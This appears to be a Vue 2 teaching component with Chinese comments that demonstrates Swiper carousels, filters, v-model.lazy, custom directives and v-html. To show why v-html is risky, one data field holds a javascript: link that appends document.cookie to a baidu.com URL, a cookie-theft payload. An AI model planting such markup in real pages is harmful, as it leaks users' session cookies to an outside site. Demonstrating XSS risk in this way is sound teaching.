<template>
  <div class="search">
    {{ a }}
    {{ num }}
    <button @click="toHome">to Home</button>
    <button @click="toSearch">to Search</button>
    <br><br>
    <div class="swiper-container">
      <div class="swiper-wrapper">
        <div v-for="item in list" :key="item" class="swiper-slide">Slide {{ item }}</div>
      </div>
      <!-- 如果需要分页器 -->
      <div class="swiper-pagination"></div>
      
      <!-- 如果需要导航按钮 -->
      <div class="swiper-button-prev"></div>
      <div class="swiper-button-next"></div>
    </div>
    <div>
      <h5>v-model.lazy--光标失去更新数据：</h5>
      <input type="text" v-model.lazy="msg">
    </div>
    <hr>
    <h5>过滤器(默认参数)：{{ time | formatTime }}</h5>
    <h5>过滤器(传参)：{{ time | formatTime('YYYY-MM-DD') }}</h5>
    <h5>过滤器串联使用：{{ time | formatTime | sliceStr }}</h5>
    <hr>
    <div>
      <h5>v-html慎重试用</h5>
      <span v-html="span"></span>
    </div>
    <hr>
    <div>
      <h5>自定义指令</h5>
      <span v-big-num="count"></span>
      <input type="text" v-focus>
    </div>
    <hr>
  </div>
</template>

<script>
import { getBaseCategoryList, getMockTestData } from '@/api'
getBaseCategoryList()
import Swiper from 'swiper'
import 'swiper/css/swiper.css'

export default {
  props: ['a'],
  data() {
    return {
      list: [],
      num: 1,
      msg: '',
      time: 1639124446679,
      span: '<a href="javascript:location.href="http://www.baidu.com?"+document.cookie">百度</a>',
      count: 1
    }
  },
  computed: {
  },
  filters: {
    sliceStr(str) {
      return str.slice(0,4)
    }
  },
  directives: {
    // big函数何时会被调用？1、指令与元素成功绑定时。2、指令所在的模板被重新解析时(例如num的改变也会使big调用)
    // 函数的写法相当于对象写法中的bind和update
    bigNum(el, binding) { // 函数写法
      // console.log(this) this指向window
      el.innerHTML = binding.value * 10
    },
    // focus: { // 对象写法
    //   bind(){}, // 只调用一次，指令第一次绑定到元素时调用
    //   inserted(el, binding) { // 被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。
    //     el.focus()
    //   },
    //   update(){} // 所在组件的 VNode 更新时调用
    // }
  },
  created() {
  },
  mounted() {
    setTimeout(() => {
      this.num++
    },2000)
    this.getMockTestData()
  },
  updated() {
  },
  methods: {
    toHome() {
      this.$router.push('/home')
    },
    toSearch() {
      // this.$router.push({ name: 'Search', params: { k: 123 }})
      // this.$router.push({ name: 'Search', query: { bbb: 1 }})
      this.$router.push('/search/1')
    },
    async getMockTestData() {
      await getMockTestData().then(res => {
        this.list = res.list
      })
      // https://www.swiper.com.cn/usage/index.html
      new Swiper('.swiper-container', {
        loop: true, // 循环模式选项
        // 如果需要分页器
        pagination: {
          el: '.swiper-pagination',
          clickable: true
        },
        // 如果需要前进后退按钮
        navigation: {
          nextEl: '.swiper-button-next',
          prevEl: '.swiper-button-prev',
        }
      })  
    }
  }
}
</script>

<style lang='less' scoped>
.search {
  .swiper-container {
    width: 600px;
    height: 300px;
    border: 1px solid lightblue;
  }
  .item {
    border: 1px solid #000;
  }
}
</style>
